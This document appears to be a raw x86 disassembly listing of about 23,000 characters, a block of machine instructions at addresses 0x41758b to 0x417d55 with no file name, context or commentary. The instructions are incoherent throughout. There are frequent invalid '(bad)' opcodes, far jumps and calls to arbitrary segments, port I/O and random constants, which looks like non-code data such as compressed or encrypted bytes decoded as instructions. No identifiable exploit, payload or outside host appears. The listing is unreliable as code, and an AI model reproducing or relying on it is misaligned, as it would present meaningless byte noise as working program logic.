  41758b:	xchg   esi,eax
  41758c:	jmp    0x4175bb
  41758e:	push   edx
  41758f:	(bad)  
  417590:	fcmovu st,st(4)
  417592:	fnstsw WORD PTR [ecx+0x71f22ec1]
  417598:	bound  eax,QWORD PTR [esi-0x7b197576]
  41759e:	push   esi
  41759f:	add    BYTE PTR [esi],0x5d
  4175a2:	sbb    edi,esi
  4175a4:	rol    DWORD PTR ss:[eax+eiz*4],cl
  4175a8:	pop    ss
  4175a9:	enter  0x8ffb,0x2c
  4175ad:	std    
  4175ae:	cwde   
  4175af:	or     DWORD PTR fs:[edx-0x77],esp
  4175b3:	sub    al,0x93
  4175b5:	jecxz  0x417622
  4175b7:	mov    ebx,0x2c2e2584
  4175bc:	adc    dh,BYTE PTR [ebx]
  4175be:	and    ecx,DWORD PTR [edi+0x46e65aa1]
  4175c4:	data16 loop 0x417593
  4175c7:	or     ebx,DWORD PTR [ebp+ebx*4-0x4bfe9475]
  4175ce:	pop    es
  4175cf:	pop    edi
  4175d0:	dec    ecx
  4175d1:	dec    eax
  4175d2:	fdivr  DWORD PTR [eax+0x1e]
  4175d5:	jmp    0xa68535d3
  4175da:	pop    ds
  4175db:	xlat   BYTE PTR ds:[ebx]
  4175dc:	push   eax
  4175dd:	adc    eax,0xa4aa65b2
  4175e2:	lods   eax,DWORD PTR ds:[esi]
  4175e3:	inc    eax
  4175e4:	inc    edx
  4175e5:	jmp    0x486112bd
  4175ea:	out    0x6f,eax
  4175ec:	dec    ebp
  4175ed:	fs push 0x6014520d
  4175f3:	lods   al,BYTE PTR ds:[esi]
  4175f4:	ret    0x1a8b
  4175f7:	jecxz  0x417597
  4175f9:	xchg   edx,eax
  4175fa:	dec    ebx
  4175fb:	les    eax,FWORD PTR [ebp+0x8396258]
  417601:	cmp    al,0x63
  417603:	out    0xf5,al
  417605:	(bad)  
  417606:	sub    al,0x3
  417608:	add    ecx,DWORD PTR [edi]
  41760a:	dec    ebp
  41760b:	adc    eax,0x2ae5a442
  417610:	sbb    DWORD PTR [esi-0x1e832ac0],0xfffffff8
  417617:	repz (bad) 
  417619:	shl    BYTE PTR [ebx],cl
  41761b:	pop    edx
  41761c:	lods   eax,DWORD PTR ds:[esi]
  41761d:	loopne 0x41767f
  41761f:	mov    ebx,0x2cd1e4b1
  417624:	fadd   QWORD PTR [edi+0x36]
  417627:	test   DWORD PTR [edx],esp
  417629:	and    eax,0x943acba4
  41762e:	gs pop ss
  417630:	jmp    0xdddc:0x3af72271
  417637:	pop    ebp
  417638:	call   0xaf99:0x35791111
  41763f:	cmp    ebx,ecx
  417641:	add    ebx,ebp
  417643:	pop    eax
  417644:	push   esi
  417646:	icebp  
  417647:	call   0xac6d9ca2
  41764c:	aas    
  41764d:	ss (bad) 
  41764f:	or     DWORD PTR [edx+0x7e],ebx
  417652:	stos   BYTE PTR es:[edi],al
  417653:	mov    esp,0xefc76274
  417658:	and    eax,0x3c588c77
  41765d:	(bad)  [esi+0x7f9765b5]
  417663:	int3   
  417664:	mov    edx,0x5326eea4
  417669:	xchg   edi,eax
  41766a:	xchg   esi,eax
  41766b:	lds    esi,FWORD PTR [esi-0x1b]
  41766e:	or     eax,0x5299da4c
  417673:	or     edx,DWORD PTR [esi]
  417675:	cmp    al,0x7e
  417677:	je     0x4176bb
  417679:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41767a:	mov    ds:0x66ccdb7c,eax
  41767f:	pop    ss
  417680:	pop    eax
  417681:	push   edx
  417682:	dec    ebx
  417683:	xchg   ebx,eax
  417684:	imul   esp,ebp,0xffffffb4
  417687:	mov    WORD PTR [edx],fs
  417689:	in     al,dx
  41768a:	mov    esp,0x147f5057
  41768f:	fist   DWORD PTR [ebp+0x5d518713]
  417695:	(bad)  
  417696:	pop    eax
  417697:	sub    BYTE PTR [edx-0xe],bl
  41769a:	cmp    al,0x21
  41769c:	jo     0x417655
  41769e:	es and eax,0xa1e4c341
  4176a4:	sbb    ch,BYTE PTR [ebx-0x5a]
  4176a7:	fwait
  4176a8:	mov    cl,0xd6
  4176aa:	and    BYTE PTR [ebx+0x5b],ch
  4176ad:	cmp    eax,0x909d9dd5
  4176b2:	clc    
  4176b3:	fwait
  4176b4:	(bad)
  4176b7:	push   esp
  4176b8:	xor    al,0x5d
  4176ba:	inc    ebp
  4176bb:	pop    edx
  4176bc:	or     cl,BYTE PTR [esi+0x4a0b034d]
  4176c2:	lds    ecx,FWORD PTR [eax]
  4176c4:	push   0x19
  4176c6:	int    0xc7
  4176c8:	not    DWORD PTR ds:0xf9771e67
  4176ce:	dec    esi
  4176cf:	shl    DWORD PTR [eax],cl
  4176d1:	pop    ecx
  4176d2:	stos   BYTE PTR es:[edi],al
  4176d3:	inc    eax
  4176d4:	fisttp DWORD PTR [ecx+0x3f]
  4176d7:	adc    esi,DWORD PTR [esi-0x22536653]
  4176dd:	xchg   DWORD PTR [edx],esi
  4176df:	dec    BYTE PTR es:[esi-0x775caee4]
  4176e6:	je     0x417673
  4176e8:	rcr    eax,0xa2
  4176eb:	jg     0x417704
  4176ed:	repnz mov ah,ch
  4176f0:	or     cl,bl
  4176f2:	and    al,0xc2
  4176f4:	ins    BYTE PTR es:[edi],dx
  4176f5:	push   edi
  4176f6:	pop    ds
  4176f7:	int    0xea
  4176f9:	ret    0x4192
  4176fc:	mov    esp,DWORD PTR [esi-0x45]
  4176ff:	xor    al,0x8f
  417701:	into   
  417702:	pushf  
  417703:	dec    ebx
  417704:	push   edi
  417705:	sub    al,0x7f
  417707:	enter  0x98cb,0xe7
  41770b:	cmp    ebx,DWORD PTR [eax+0x32925cf]
  417711:	push   ss
  417712:	enter  0xd81f,0x66
  417716:	ds test al,0xc
  417719:	xchg   edx,eax
  41771a:	fs inc eax
  41771c:	dec    esp
  41771d:	jl     0x4176f8
  41771f:	jbe    0x4176ea
  417721:	xchg   BYTE PTR [ebx],dl
  417723:	adc    BYTE PTR [ebp-0x2157bdee],ah
  417729:	xor    eax,0xb3efba19
  41772e:	shl    BYTE PTR [ecx-0x4c408de8],0x1c
  417735:	and    eax,0x5fa019f8
  41773a:	push   ds
  41773b:	xchg   ebp,eax
  41773c:	pop    edi
  41773d:	jno    0x4176cc
  41773f:	jecxz  0x417712
  417741:	mov    cl,0x33
  417743:	push   esp
  417744:	and    eax,0xe42a3f7b
  417749:	ror    bh,0xb3
  41774c:	into   
  41774d:	in     al,0x18
  41774f:	test   eax,0xbd05f553
  417754:	aam    0xad
  417756:	lods   al,BYTE PTR ds:[esi]
  417757:	jmp    0x5cb5:0xe20d3f8
  41775e:	sub    BYTE PTR [edi-0x13f55280],ch
  417764:	mov    bh,0xe7
  417766:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417767:	fst    DWORD PTR [edi]
  417769:	jno    0x4177cc
  41776b:	mov    ecx,DWORD PTR [edx+0x66]
  41776e:	xchg   esp,eax
  41776f:	mov    ebp,0xb0c7d674
  417774:	jns    0x417710
  417776:	data16 fcmovnu st,st(0)
  417779:	and    edi,edx
  41777b:	adc    eax,0xa7a08242
  417780:	pop    ebx
  417781:	retf   0x8503
  417784:	xor    dl,BYTE PTR [ecx-0x1a]
  417787:	inc    edi
  417788:	or     eax,0x57214e88
  41778d:	pop    ds
  41778e:	data16 into 
  417790:	ds mov ebp,0x5ff66864
  417796:	retf   
  417797:	and    ebp,DWORD PTR [esp+eiz*2-0x38]
  41779b:	xchg   ebx,eax
  41779c:	pop    DWORD PTR [esi]
  41779e:	fdivr  QWORD PTR [eax+0x39dfaf4d]
  4177a4:	cwde   
  4177a5:	xchg   edi,eax
  4177a6:	xlat   BYTE PTR ds:[ebx]
  4177a7:	and    ebx,DWORD PTR [ecx+0x55]
  4177aa:	fidiv  DWORD PTR [ecx-0x18]
  4177ad:	stc    
  4177ae:	scas   al,BYTE PTR es:[edi]
  4177af:	or     cl,al
  4177b1:	fcomi  st,st(0)
  4177b3:	leave  
  4177b4:	pop    edx
  4177b5:	pop    ss
  4177b6:	fdivr  st(0),st
  4177b8:	or     ah,BYTE PTR [ecx-0x5efcd5f2]
  4177be:	aad    0xf7
  4177c0:	adc    al,0xc7
  4177c2:	push   eax
  4177c3:	das    
  4177c4:	jns    0x417818
  4177c6:	inc    edx
  4177c7:	(bad)  
  4177c9:	xchg   ecx,eax
  4177ca:	cwde   
  4177cb:	inc    ecx
  4177cc:	push   edi
  4177cd:	mov    esp,ss
  4177cf:	cli    
  4177d0:	and    DWORD PTR [ebx+0x6cb5ff70],esp
  4177d6:	das    
  4177d7:	sahf   
  4177d8:	fnsave [esi-0x14]
  4177db:	xchg   ebp,eax
  4177dc:	sub    bl,al
  4177de:	adc    bl,al
  4177e0:	pop    es
  4177e1:	loop   0x4177d3
  4177e3:	dec    esp
  4177e4:	mov    ds:0xf235d163,al
  4177e9:	fwait
  4177ea:	(bad)  
  4177eb:	cmp    esp,esi
  4177ed:	adc    al,0x6f
  4177ef:	fsub   DWORD PTR [eax-0x5648ab7e]
  4177f5:	inc    eax
  4177f6:	in     eax,dx
  4177f7:	fwait
  4177f8:	sub    dl,BYTE PTR [edi-0x5e24e671]
  4177fe:	xlat   BYTE PTR ds:[ebx]
  4177ff:	punpckhdq mm3,QWORD PTR [esi-0x32b80f98]
  417806:	xchg   DWORD PTR [edx],edi
  417808:	inc    esi
  417809:	or     eax,0x8fe8f176
  41780e:	dec    ecx
  41780f:	lock cdq 
  417811:	cdq    
  417812:	fs jmp 0x9d2e:0xd6c706a
  41781a:	pusha  
  41781b:	xor    eax,esp
  41781d:	sbb    al,0x63
  41781f:	mov    ecx,0x72b5ea1e
  417824:	pop    ebp
  417825:	and    al,0x1c
  417827:	clc    
  417828:	int    0x81
  41782a:	adc    al,ch
  41782c:	lods   eax,DWORD PTR ds:[esi]
  41782d:	add    bl,0xc2
  417830:	loop   0x417825
  417832:	popa   
  417833:	call   0x7b5daa96
  417838:	popa   
  417839:	push   esi
  41783a:	pop    esi
  41783b:	add    eax,0xeedfc68e
  417840:	pop    esi
  417841:	rcl    ah,0x56
  417844:	cmp    ch,BYTE PTR [edi]
  417846:	add    eax,0xbce16392
  41784b:	in     al,dx
  41784c:	ja     0x4177dd
  41784e:	jb     0x41782c
  417850:	sub    eax,0xd24276f9
  417855:	pop    ecx
  417856:	in     al,0xf6
  417858:	inc    esi
  417859:	xchg   edx,eax
  41785a:	call   0xffa40250
  41785f:	dec    ecx
  417860:	test   DWORD PTR [edi+0x6b],0x2c8199f
  417867:	fs in  al,0xeb
  41786a:	int3   
  41786b:	das    
  41786c:	pop    ds
  41786d:	xlat   BYTE PTR ds:[ebx]
  41786e:	sbb    al,0x29
  417870:	add    DWORD PTR [edi+ebp*2-0x67],ebp
  417874:	jecxz  0x417832
  417876:	and    DWORD PTR [ebx+eiz*2-0x37],eax
  41787a:	sbb    bh,bl
  41787c:	(bad)  [ecx-0x5606bbb1]
  417882:	popa   
  417883:	lahf   
  417884:	repz test al,0xb
  417887:	popa   
  417888:	adc    ebx,0xce8e2854
  41788e:	arpl   ax,cx
  417890:	and    eax,0x4bdd858b
  417895:	xor    eax,0xcc8b6462
  41789a:	mov    bl,0x62
  41789c:	mov    dl,0xb6
  41789e:	mov    bl,0xcb
  4178a0:	mov    al,es:0xfb53a77b
  4178a6:	icebp  
  4178a7:	(bad)  
  4178a8:	mov    ds:0xe05ab742,al
  4178ad:	add    al,0xf8
  4178af:	fistp  QWORD PTR [ecx]
  4178b1:	sub    eax,0x82d0a3c0
  4178b6:	lods   eax,DWORD PTR ds:[esi]
  4178b7:	mov    cl,0x67
  4178b9:	sbb    DWORD PTR [edx-0x333ea793],esp
  4178bf:	add    al,0xbc
  4178c1:	scas   eax,DWORD PTR es:[edi]
  4178c2:	in     eax,0x75
  4178c4:	popa   
  4178c5:	mov    esi,0x8d606a80
  4178ca:	xlat   BYTE PTR ds:[ebx]
  4178cb:	pushf  
  4178cc:	inc    eax
  4178cd:	clc    
  4178ce:	or     al,0x84
  4178d0:	push   edi
  4178d1:	adc    ebx,ebp
  4178d3:	ret    0x6f9c
  4178d6:	pop    ebx
  4178d7:	xchg   ebx,eax
  4178d8:	fwait
  4178d9:	in     al,0xe1
  4178db:	daa    
  4178dc:	inc    ebp
  4178dd:	repz stc 
  4178df:	inc    esp
  4178e0:	out    0x4e,al
  4178e2:	adc    eax,0xd5a71bd2
  4178e7:	(bad)  [esi+0x7b6a724b]
  4178ed:	inc    esp
  4178ee:	mov    ah,0xad
  4178f0:	push   cs
  4178f1:	xchg   DWORD PTR [eax+0x19],edx
  4178f4:	icebp  
  4178f5:	dec    ebx
  4178f6:	dec    esp
  4178f7:	inc    esp
  4178f8:	inc    ecx
  4178f9:	call   0xcbf13739
  4178fe:	mov    BYTE PTR ds:0xe12e3039,dl
  417904:	bswap  eax
  417906:	cmp    ebx,DWORD PTR [eax+ebx*1]
  417909:	sub    al,0x8
  41790b:	stos   DWORD PTR es:[edi],eax
  41790c:	xchg   edi,eax
  41790d:	fdiv   QWORD PTR [esi-0xda0483]
  417913:	pusha  
  417914:	push   ebx
  417915:	aam    0xf6
  417917:	mov    bl,BYTE PTR [ebx+0x4e94fd0e]
  41791d:	cli    
  41791e:	(bad)  
  41791f:	jmp    0xe97d:0xea39a0ea
  417926:	ret    0x3038
  417929:	test   edi,0x73bf14ac
  41792f:	imul   edi,DWORD PTR [ecx-0x421e664e],0x7
  417936:	adc    DWORD PTR [eax],ebx
  417938:	cld    
  417939:	dec    eax
  41793a:	(bad)  
  41793b:	push   ds
  41793c:	sti    
  41793d:	or     bl,BYTE PTR [esi]
  41793f:	repz push 0xbfa63c2e
  417945:	mov    ds:0x42f5f40e,al
  41794a:	out    dx,al
  41794b:	cli    
  41794c:	fs fs (bad) 
  41794f:	clc    
  417950:	mov    eax,ds:0x394b8b85
  417955:	add    DWORD PTR [ebx],ebp
  417957:	(bad)  
  417958:	out    dx,al
  417959:	fwait
  41795a:	mov    bl,0x31
  41795c:	popa   
  41795d:	cmp    esp,ebp
  41795f:	dec    ebx
  417960:	push   0xffffffed
  417962:	adc    DWORD PTR [ebx-0xd],ebp
  417965:	mov    eax,ds:0xe8449610
  41796a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41796b:	cmp    BYTE PTR [edx+eax*2+0x4214d26f],al
  417972:	in     al,0x82
  417974:	in     al,0x86
  417976:	cmp    eax,0xebdd1a47
  41797b:	les    edi,FWORD PTR [edx+0x1f56ed87]
  417981:	pop    ecx
  417982:	mov    ah,0x6e
  417984:	push   ebp
  417985:	in     eax,0x8
  417987:	and    DWORD PTR [esi-0x604c1cd4],esi
  41798d:	scas   eax,DWORD PTR es:[edi]
  41798e:	daa    
  41798f:	inc    esi
  417990:	arpl   WORD PTR [eax-0x49ec34ee],sp
  417996:	hlt    
  417997:	sub    DWORD PTR [eax],ecx
  417999:	mov    bl,0xe9
  41799b:	int3   
  41799c:	cwde   
  41799d:	je     0x4179f3
  41799f:	test   eax,0x6ffaf5bc
  4179a4:	mov    esp,0x13aca14a
  4179a9:	fdiv   QWORD PTR [edx]
  4179ab:	ja     0x41798b
  4179ad:	push   ebx
  4179ae:	mov    ecx,0x62c43047
  4179b3:	inc    esi
  4179b4:	pop    esi
  4179b5:	xchg   esi,eax
  4179b6:	ret    
  4179b7:	mov    cl,0x56
  4179b9:	pop    eax
  4179ba:	sbb    DWORD PTR [edx-0x1b],0xffffffd2
  4179be:	cmp    BYTE PTR [ebx+edi*2+0x51],bh
  4179c2:	adc    eax,0xa2d6586
  4179c7:	ins    BYTE PTR es:[edi],dx
  4179c8:	fmul   QWORD PTR [esi]
  4179ca:	scas   eax,DWORD PTR es:[edi]
  4179cb:	push   ebx
  4179cc:	pushf  
  4179cd:	push   edx
  4179ce:	mov    esi,0xca939d38
  4179d3:	and    eax,0x53ce090f
  4179d8:	outs   dx,DWORD PTR ds:[esi]
  4179d9:	arpl   di,di
  4179db:	pop    es
  4179dc:	shl    DWORD PTR [ecx],cl
  4179de:	fs cmp al,0x6f
  4179e1:	xlat   BYTE PTR ds:[ebx]
  4179e2:	pop    ecx
  4179e3:	cs and al,0x76
  4179e6:	ror    DWORD PTR [edx],cl
  4179e8:	retf   
  4179e9:	push   esi
  4179ea:	xlat   BYTE PTR ds:[ebx]
  4179eb:	popf   
  4179ec:	jl     0x417993
  4179ee:	mov    esi,0xcf939e42
  4179f3:	mov    edx,0xe25725e0
  4179f8:	xchg   BYTE PTR [ebp-0x47],bl
  4179fb:	cmp    esp,DWORD PTR [ebx+0x2e]
  4179fe:	cmp    bh,BYTE PTR [edx+0x71115612]
  417a04:	dec    edx
  417a05:	cli    
  417a06:	pop    es
  417a07:	push   ecx
  417a08:	dec    ecx
  417a09:	pushf  
  417a0a:	das    
  417a0b:	sub    eax,0x8928dad4
  417a10:	add    BYTE PTR [edi],cl
  417a12:	add    DWORD PTR [ecx+0x26],edi
  417a15:	jno    0x417a56
  417a17:	mov    ebx,0xe14e6b
  417a1c:	lods   al,BYTE PTR ds:[esi]
  417a1d:	pop    edx
  417a1e:	jno    0x417a36
  417a20:	dec    edx
  417a21:	jb     0x417a24
  417a23:	test   DWORD PTR [ebx-0x44f9eadd],ecx
  417a29:	loope  0x4179e8
  417a2b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417a2c:	xchg   ebp,eax
  417a2d:	push   esp
  417a2e:	ja     0x417a11
  417a30:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417a31:	cmp    al,BYTE PTR [esi]
  417a33:	xor    al,0x34
  417a35:	bound  esp,QWORD PTR [ebx]
  417a37:	call   0x8a74:0xd531b850
  417a3e:	jo     0x417a77
  417a40:	cli    
  417a41:	mov    BYTE PTR [ebx+0x10],dl
  417a44:	ins    DWORD PTR es:[edi],dx
  417a45:	pop    ax
  417a47:	call   0x48be7f69
  417a4c:	mov    esp,ss
  417a4e:	js     0x417a85
  417a50:	test   ch,bh
  417a52:	fst    DWORD PTR [esi]
  417a54:	loope  0x417a9b
  417a56:	mov    esi,DWORD PTR [edi]
  417a58:	or     BYTE PTR [esi+0x1d],0xd
  417a5c:	(bad)  
  417a5d:	push   eax
  417a5e:	push   cs
  417a5f:	sbb    eax,0x5e595f4f
  417a64:	imul   ebx,DWORD PTR [eax],0xffffffe9
  417a67:	pop    es
  417a68:	jg     0x417a45
  417a6a:	mov    dl,0x6
  417a6c:	leave  
  417a6d:	cmp    ebp,DWORD PTR ds:0xd82313c7
  417a73:	and    al,0x19
  417a75:	xor    BYTE PTR [ecx-0xee9970c],0x95
  417a7c:	mov    esp,ebp
  417a7e:	loope  0x417ab7
  417a80:	in     al,0x7f
  417a82:	test   DWORD PTR [esi+0x6adf4bb8],eax
  417a88:	dec    esp
  417a89:	dec    esi
  417a8a:	ret    0x124c
  417a8d:	lods   eax,DWORD PTR ds:[esi]
  417a8e:	pop    ebp
  417a8f:	aaa    
  417a90:	(bad)  
  417a91:	xor    ecx,0xdf5bd628
  417a97:	and    eax,0x62c59176
  417a9c:	(bad)  
  417a9d:	ret    
  417a9e:	xchg   ebx,eax
  417a9f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417aa0:	xchg   esi,eax
  417aa1:	(bad)  
  417aa2:	mov    ds:0x14987ce4,eax
  417aa7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417aa8:	lods   eax,DWORD PTR ds:[esi]
  417aa9:	mov    edi,0x655c694e
  417aae:	aam    0x7a
  417ab0:	jo     0x417a55
  417ab2:	xchg   edi,eax
  417ab3:	cmp    DWORD PTR [ebx],edx
  417ab5:	mov    fs,WORD PTR [ecx+0x36a093e3]
  417abb:	mov    edx,0x2ddeaf
  417ac0:	lods   eax,DWORD PTR ds:[esi]
  417ac1:	sbb    DWORD PTR [ebp-0x33],esp
  417ac4:	mov    al,ds:0x57f68893
  417ac9:	lods   eax,DWORD PTR ds:[esi]
  417aca:	fcomi  st,st(4)
  417acc:	add    ah,bh
  417ace:	add    BYTE PTR ds:0xf71003c,bl
  417ad4:	(bad)  
  417ad5:	out    0xae,eax
  417ad7:	xchg   ecx,eax
  417ad8:	or     al,0x93
  417ada:	adc    bl,BYTE PTR [eax+eiz*4-0x45e38c0f]
  417ae1:	cdq    
  417ae2:	cmc    
  417ae3:	inc    ecx
  417ae4:	pop    esi
  417ae5:	xor    eax,0x9de483e3
  417aea:	pop    edi
  417aeb:	rcl    BYTE PTR [edi-0x25],1
  417aee:	cmc    
  417aef:	push   esi
  417af0:	jge    0x417b20
  417af2:	and    eax,0x29c8daf5
  417af7:	clc    
  417af8:	loopne 0x417a82
  417afa:	xlat   BYTE PTR ds:[ebx]
  417afb:	mov    al,ds:0x484e8eb0
  417b00:	push   ds
  417b01:	push   0x7a02a810
  417b06:	adc    eax,0x84c77c1f
  417b0b:	jl     0x417ac3
  417b0d:	sbb    ah,BYTE PTR [ebx+0x1ea72811]
  417b13:	shl    BYTE PTR [ebx],1
  417b15:	mov    ah,0x72
  417b17:	jp     0x417b76
  417b19:	xchg   ecx,eax
  417b1a:	dec    ebx
  417b1b:	ins    BYTE PTR es:[edi],dx
  417b1c:	push   ss
  417b1d:	loop   0x417b33
  417b1f:	sbb    eax,0xbad72cba
  417b24:	mov    edi,0x68233bbf
  417b29:	scas   al,BYTE PTR es:[edi]
  417b2a:	sub    al,0x61
  417b2c:	xchg   BYTE PTR [ebx+0x71564983],ah
  417b32:	inc    esi
  417b33:	mov    bh,0x6e
  417b35:	mov    ss,esp
  417b37:	mov    cl,0x8e
  417b39:	sbb    BYTE PTR [eax],ch
  417b3b:	ds pop edi
  417b3d:	mov    eax,0x809e71dd
  417b42:	mov    cl,0x70
  417b44:	mov    ch,0xb0
  417b46:	jbe    0x417b75
  417b48:	mov    esp,esi
  417b4a:	(bad)  
  417b4c:	xchg   bh,al
  417b4e:	dec    eax
  417b4f:	aaa    
  417b50:	call   0xa9d3:0x92fc7b1a
  417b57:	(bad)  
  417b58:	jae    0x417bd7
  417b5a:	sub    DWORD PTR [ebp-0x57],eax
  417b5d:	inc    eax
  417b5e:	addr16 push es
  417b60:	sbb    ecx,DWORD PTR [ebx]
  417b62:	test   BYTE PTR [ebx+ecx*4+0x49c35c7],al
  417b69:	add    DWORD PTR [edx+0x14088799],ecx
  417b6f:	cmp    eax,0x33fffd62
  417b74:	add    DWORD PTR [edi],eax
  417b76:	mov    al,ds:0x31f024b2
  417b7b:	pop    eax
  417b7c:	push   ebx
  417b7d:	popf   
  417b7e:	mov    es,WORD PTR [edi-0x3d]
  417b81:	adc    BYTE PTR [ebx-0x78],ch
  417b84:	mov    ecx,0x9f2fbf3
  417b89:	jmp    0x417b97
  417b8b:	inc    edx
  417b8c:	cli    
  417b8d:	mov    ds:0x87565d26,eax
  417b92:	clc    
  417b93:	cmp    DWORD PTR [ebp+0x65],eax
  417b96:	sbb    eax,0x90f1a27a
  417b9b:	inc    esi
  417b9c:	pop    ecx
  417b9d:	inc    eax
  417b9e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417b9f:	ret    0xad81
  417ba2:	sbb    eax,0x6928a8c9
  417ba7:	scas   eax,DWORD PTR es:[edi]
  417ba8:	lods   eax,DWORD PTR ds:[esi]
  417ba9:	stc    
  417baa:	or     cl,BYTE PTR [eax+edi*1-0x7ed30161]
  417bb1:	pop    edi
  417bb2:	je     0x417b94
  417bb4:	mov    ch,0xd4
  417bb6:	add    eax,eax
  417bb8:	js     0x417ba2
  417bba:	inc    edx
  417bbb:	retf   0x435b
  417bbe:	call   0xe4ed0dd
  417bc3:	shl    dh,0xf
  417bc6:	dec    ebx
  417bc7:	sub    al,cl
  417bc9:	pop    edx
  417bca:	dec    esp
  417bcb:	sub    ecx,DWORD PTR [ebx-0x6d9e31dc]
  417bd1:	nop
  417bd2:	inc    ebx
  417bd3:	sub    al,0xe6
  417bd5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417bd6:	or     BYTE PTR [esi+0x57fe21fb],ch
  417bdc:	int3   
  417bdd:	dec    eax
  417bde:	(bad)  
  417bdf:	or     ebp,DWORD PTR [ebx+0x49]
  417be2:	pop    ss
  417be3:	sbb    DWORD PTR gs:[edi+0x35],ebp
  417be7:	in     eax,dx
  417be8:	mov    dl,0x86
  417bea:	xor    dh,ah
  417bec:	cdq    
  417bed:	pop    esi
  417bee:	add    eax,0xa3784ac1
  417bf3:	test   al,0xf0
  417bf5:	cs mov cl,0x8a
  417bf8:	inc    ebx
  417bf9:	mov    cl,0x30
  417bfb:	(bad)  
  417bfc:	xor    DWORD PTR cs:[edx-0x5bc04fbb],ecx
  417c03:	mov    WORD PTR [edi-0x62],cs
  417c06:	xor    DWORD PTR [edx+0x69f8e25a],ecx
  417c0c:	fdiv   QWORD PTR [eax+0x44]
  417c0f:	push   ebp
  417c10:	cmp    al,0xbc
  417c12:	jmp    0xf68285ca
  417c17:	inc    eax
  417c18:	mov    DWORD PTR [ebp-0x64],ecx
  417c1b:	fs pop esp
  417c1d:	adc    al,0x1d
  417c1f:	inc    esi
  417c20:	push   ss
  417c21:	pop    ds
  417c22:	scas   eax,DWORD PTR es:[edi]
  417c23:	jbe    0x417bd9
  417c25:	mov    ds:0x6afc2737,eax
  417c2a:	push   ebx
  417c2b:	xrelease mov DWORD PTR [esi+0x28f50600],0x3a1220e7
  417c36:	rcl    bh,cl
  417c38:	aaa    
  417c39:	ja     0x417be2
  417c3b:	adc    DWORD PTR [ebp-0x27f46f8a],edx
  417c41:	xor    eax,0x6ac0af23
  417c46:	mov    esp,ds
  417c48:	jno    0x417cb7
  417c4a:	iret   
  417c4b:	loop   0x417c11
  417c4d:	mov    edi,0xea9f4d5a
  417c52:	(bad)  
  417c53:	lods   eax,DWORD PTR ds:[esi]
  417c54:	add    ebx,edi
  417c56:	mov    dl,0xba
  417c58:	call   0x166a:0xa720eb36
  417c5f:	jnp    0x417cc7
  417c61:	cmps   BYTE PTR ss:[esi],BYTE PTR es:[edi]
  417c63:	mov    cl,0x3
  417c65:	mov    edx,0x5933d795
  417c6a:	inc    esp
  417c6b:	mov    ch,0x8b
  417c6d:	daa    
  417c6e:	shl    DWORD PTR [ebx-0x50eb0c79],cl
  417c74:	xchg   ebx,eax
  417c75:	mov    ebp,?
  417c77:	jno    0x417c28
  417c79:	popa   
  417c7a:	xor    esp,DWORD PTR [ebx+edi*2+0x37]
  417c7e:	ret    
  417c7f:	int3   
  417c80:	inc    ebp
  417c81:	lock sbb BYTE PTR [ecx],0xc3
  417c85:	std    
  417c86:	pop    edx
  417c87:	xchg   esi,eax
  417c88:	sahf   
  417c89:	ret    0x1061
  417c8c:	add    ch,ch
  417c8e:	push   ebp
  417c8f:	sbb    ebx,DWORD PTR [ebp*8-0x5f474fbf]
  417c96:	mov    dh,0x57
  417c98:	sti    
  417c99:	adc    BYTE PTR [eax+0x58],ch
  417c9c:	imul   edx,DWORD PTR [edx],0xbdd47c3c
  417ca2:	mov    eax,ds:0x311bb937
  417ca7:	xlat   BYTE PTR ds:[ebx]
  417ca8:	(bad)  
  417ca9:	imul   esi,esp,0xffffff91
  417cac:	jno    0x417c57
  417cae:	or     esp,DWORD PTR [eax-0x25]
  417cb1:	(bad)  [ebx-0x51d72905]
  417cb7:	aaa    
  417cb8:	inc    ebp
  417cb9:	cmp    esp,esp
  417cbb:	dec    ebx
  417cbc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417cbd:	andnps xmm0,XMMWORD PTR [esi+0x52a5b6df]
  417cc4:	xchg   edx,eax
  417cc5:	pop    ss
  417cc6:	pop    ds
  417cc7:	(bad)  
  417cc8:	inc    DWORD PTR [edi-0x17769e1e]
  417cce:	or     esi,ecx
  417cd0:	and    eax,0x9549351e
  417cd5:	or     al,0xec
  417cd7:	push   ds
  417cd8:	bound  edi,QWORD PTR [ebp+ecx*4+0x58a49d3b]
  417cdf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417ce0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417ce1:	add    ecx,esp
  417ce3:	sti    
  417ce4:	add    ah,BYTE PTR [edx+0x31]
  417ce7:	mov    dl,BYTE PTR [esi-0x1e]
  417cea:	sbb    DWORD PTR ds:0xb6b6a463,ebx
  417cf0:	inc    eax
  417cf1:	int3   
  417cf2:	add    al,0xab
  417cf4:	mov    ds:0xf8a3f238,eax
  417cf9:	hlt    
  417cfa:	fwait
  417cfb:	and    al,0xbe
  417cfd:	retf   0xef4b
  417d00:	fwait
  417d01:	adc    esp,DWORD PTR [esi]
  417d03:	retf   
  417d04:	lds    ebp,FWORD PTR [eax+0x3caef837]
  417d0a:	js     0x417d5d
  417d0c:	xchg   edx,eax
  417d0d:	inc    ecx
  417d0e:	les    esp,FWORD PTR [eax-0x79ee08fc]
  417d14:	push   eax
  417d15:	lock inc dl
  417d18:	mov    WORD PTR [edi],?
  417d1a:	xor    edx,DWORD PTR ds:0x2bbb3e9a
  417d20:	out    0x87,al
  417d22:	sub    bl,al
  417d24:	fistp  DWORD PTR [ebx-0x38]
  417d27:	mov    DWORD PTR [eax-0x3c592f6d],ebx
  417d2d:	jle    0x417cc3
  417d2f:	inc    edi
  417d30:	mov    ds:0xfc62ec94,eax
  417d35:	cmp    DWORD PTR [ebp+0x25],edi
  417d38:	out    dx,eax
  417d39:	fsub   DWORD PTR [ebx-0x5a66b453]
  417d3f:	dec    esi
  417d40:	xor    eax,0xfd99a4d3
  417d45:	in     eax,dx
  417d46:	call   0xe6ff:0x43daf27b
  417d4d:	mov    ds:0x5a2f6d3d,al
  417d52:	cmp    BYTE PTR [ecx],cl
  417d54:	ins    BYTE PTR es:[edi],dx
  417d55:	mov    al,0xc7
